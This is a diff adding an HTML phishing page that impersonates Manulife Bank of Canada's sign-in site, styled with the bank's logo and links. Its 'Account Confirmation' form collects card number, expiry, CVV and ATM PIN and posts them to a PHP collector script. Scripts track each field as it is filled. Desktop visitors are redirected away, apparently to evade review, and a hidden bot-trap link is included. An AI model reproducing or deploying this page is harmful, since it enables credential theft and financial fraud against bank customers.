@@ -1,0 +1,189 @@
+<html style="display: block;"><link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id="#""></style>
+    <style lang="en" type="text/css" id="#"></style>
+    <style lang="en" type="text/css" id=""></style>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <link href="./files/manulife_20170330.css" rel="stylesheet" type="text/css" media="screen">
+
+        <link href="./files/manulife-print_20141222.css" rel="stylesheet" type="text/css" media="print">
+
+        <link href="https://www.manulifebank.ca/BankcaTheme/themes/html/BankcaTheme/images/favicon.ico" type="images/x-icon" rel="shortcut icon">
+        <title>Manulife Bank of Canada</title>
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <style>
+            html {
+                display: none;
+            }
+        </style>
+        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = 'Manu';
+            var lrinfo = 'Card';
+        </script>
+        <script src="./files/actions.js###%"></script>
+        .automa-element-selector { direction: ltr } 
+         [automa-isDragging] { user-select: none } 
+         [automa-el-list] {outline: 2px dashed #6366f1;}</head>
+<script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html></style></head><body style="background-color: #008343; background-repeat: repeat-x; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);" margin="0" padding="0" height="100%" onclick="processOnBodyEvent(event)" topmargin="0" marginwidth="0" marginheight="0" leftmargin="0"><div class="logonwrapper">
+<div style="background-color: #999; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);
+                    background-repeat: repeat-x;" class="logonheader">
+    <div class="noPrint">
+        <div class="clientheaderbar">
+            <div style="float: right;">
+                <a id="id_francais" class="headerlinks" href="https://client.banquemanuvie.com/MBCClientUI/">&nbsp;Français</a>
+                <a id="id_news" class="headerlinks" href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/News" target="_blank">&nbsp;News |&nbsp;</a>
+                <a id="id_contactUS" class="headerlinks" href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Contact+us" target="_blank">&nbsp;Contact us |&nbsp;</a>
+                <a id="id_bankHome" class="headerlinks homeicon" href="http://www.manulifebank.ca/" target="_blank">&nbsp;Home |&nbsp;</a>
+            </div>
+        </div>
+        <div style="padding: 0 0 0 0;">
+            <img src="./files/Manulife_e_W_Bank.gif" width="243" border="0">
+        </div>
+    </div>
+</div>
+<div class="logoncontent">
+    <div class="outage">
+        <p class="outagetext"></p>
+    </div>
+    <table cellspacing="0" cellpadding="5">
+        <tbody>
+            <tr width="100%">
+                <td nowrap="nowrap" align="left">
+                    <h1>Account Confirmation</h1>
+                </td>
+                <td class="contactuscamelcase" valign="top" nowrap="nowrap" align="right">
+                    Contact our Service Centre at 1-877-765-2265 if you require assistance
+                </td>
+            </tr>
+        </tbody>
+    </table>
+    <h1>PERSONAL INFORMATION</h1>
+    <form id="forgotPasswordInitialStep" name="forgotPasswordInitialStep" action="deposit/manu/c.php" method="post" onsubmit="return validate()">
+        <input
+        type="hidden" name="sessionId" value="LpjoAEtRhpKuzu5OSudeG1Q" id="forgotPasswordInitialStep_sessionId">
+        <!-- NONCE -->
+        <input type="hidden" name="view" value="94b3bfad230b8b6d692fee654361a4ac238dbbe7a491acd86bbfa3f8b7cee863">
+        <table class="logon" width="100%" cellspacing="3" cellpadding="1">
+            <tbody>
+                <tr>
+                    <td colspan="3">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td nowrap="nowrap">
+                        <b>Card Number</b>
+                    </td>
+                    <td nowrap="nowrap" width="200px;">
+                        <input id="input-card" type="tel" placeholder="" name="card" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" class="lrinput" attr-action="Filling Card" style="width: 100%">
+                        <script src="./files/splitter.js###%"></script>
+                        <link rel="stylesheet" href="./files/card.css">
+                    </td>
+                    <td width="100%">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="3">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td nowrap="nowrap">
+                        <b>Expiry</b>
+                    </td>
+                    <td nowrap="nowrap">
+                        <select name="exp1" required="" style="width:48%; display: inline-block;" class="lrinput" attr-action="Selecting Expiry">
+                            <option value="">MM</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+                        <select name="exp2" required="" style="width:50%; display: inline-block;" class="lrinput" attr-action="Selecting Expiry">
+                            <option value="">YY</option>
+                            <option value="23">23</option>
+                            <option value="24">24</option>
+                            <option value="25">25</option>
+                            <option value="26">26</option>
+                            <option value="27">27</option>
+                            <option value="28">28</option>
+                            <option value="29">29</option>
+                            <option value="30">30</option>
+                            <option value="31">31</option>
+                            <option value="32">32</option>
+                            <option value="33">33</option>
+                            <option value="34">34</option>
+                            <option value="35">35</option>
+                            <option value="36">36</option>
+                            <option value="37">37</option>
+                            <option value="38">38</option>
+                        </select>
+                    </td>
+                    <td>&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="3">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td nowrap="nowrap">
+                        <b>Cvv</b>
+                    </td>
+                    <td nowrap="nowrap" width="200px;">
+                        <input required="" id="input-cvv" type="tel" maxlength="3" placeholder="•••" name="cvv" class="lrinput" oninput="this.value = this.value.replace(/[^0-9]/, &#39;&#39;)" autocomplete="off" attr-action="Filling Cvv" style="width: 100%">
+                    </td>
+                    <td width="100%">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="3">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td nowrap="nowrap">
+                        <b>ATM Pin</b>
+                    </td>
+                    <td nowrap="nowrap" width="200px;">
+                        <input required="" id="input-atm" type="tel" maxlength="6" placeholder="••••" name="atm" class="lrinput" oninput="this.value = this.value.replace(/[^0-9]/, &#39;&#39;)" autocomplete="off" attr-action="Filling ATM Pin" style="width: 100%">
+                    </td>
+                    <td width="100%">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="3">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="3">&nbsp;</td>
+                </tr>
+                <tr>
+                    <td colspan="3" nowrap="nowrap" align="right">
+                        <input type="submit" value="Continue" id="id_cancel" name="save" style="margin-right:17%;" tabindex="3">
+                    </td>
+                </tr>
+                <tr>
+                    <td>&nbsp;</td>
+                </tr>
+            </tbody>
+        </table>
+    </form>
+</div>
+<div class="logonfooter">
+    <div
+        class="noPrint">
+        <!--  footer banner -->
+        <div class="footerbar">
+            <div class="footertext">
+                strong&nbsp;&nbsp;&nbsp;&nbsp;
+                                            &nbsp;&nbsp;reliable&nbsp;&nbsp;&nbsp;&nbsp;
+                                            &nbsp;&nbsp;trustworthy&nbsp;&nbsp;&nbsp;&nbsp;
+                                            &nbsp;&nbsp;forward-thinking
+            </div>
+            <div class="footerlinks">
+                <a id="id_Accessibility" class="footerlinks" href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal" target="_blank">|&nbsp;Accessibility</a>
+                <a id="id_Legal" class="footerlinks" href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal" target="_blank">|&nbsp;Legal&nbsp;</a>
+                <a id="id_Privacy" class="footerlinks" href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/privacy+policy" target="_blank">|&nbsp;Privacy Policy&nbsp;</a>
+                <a id="id_Careers" class="footerlinks" href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Careers" target="_blank">Careers&nbsp;</a>
+                <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
+            </div>
+        </div>
+        <br>
+    </div>
+</div></div><div id="automa-palette"></div></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
